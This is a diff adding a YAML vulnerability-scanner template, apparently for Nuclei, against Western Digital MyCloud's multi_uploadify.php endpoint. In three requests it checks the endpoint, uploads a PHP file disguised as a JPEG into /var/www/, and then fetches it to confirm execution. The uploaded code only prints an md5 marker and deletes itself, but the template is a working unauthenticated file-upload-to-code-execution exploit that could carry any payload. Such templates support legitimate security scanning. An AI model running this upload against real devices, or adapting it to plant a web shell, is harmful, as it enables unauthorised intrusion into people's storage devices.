@@ -1,0 +1,42 @@
+id: yaml-poc-westerndigital-mycloud-file_upload-CT-416681
+info:
+  name: Yaml Poc Westerndigital Mycloud File_Upload Ct 416681
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-westerndigital-mycloud-file_upload-CT-416681'
+  tags: fileupload
+  reference: []
+http:
+- method: GET
+  path:
+  - /web/jquery/uploader/multi_uploadify.php?status=1
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
+- method: POST
+  path:
+  - /web/jquery/uploader/multi_uploadify.php?folder=/var/www/
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"Filedata[]\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\
+    \n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
+- method: GET
+  path:
+  - /{{randname}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
